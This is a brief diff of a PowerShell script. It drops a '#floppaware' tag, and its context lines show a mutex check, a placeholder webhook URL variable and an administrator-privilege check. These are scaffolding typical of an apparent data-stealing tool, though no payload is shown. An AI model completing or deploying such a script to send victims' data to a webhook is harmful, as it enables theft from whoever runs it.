@@ -16,12 +16,10 @@ function MUTEX-CHECK {
     
 }
 
-#floppaware
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 
 $webhook = "YOUR_WEBHOOK_HERE"
 $debug_mode = $false
-
 
 function Invoke-Admin_Check {
     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
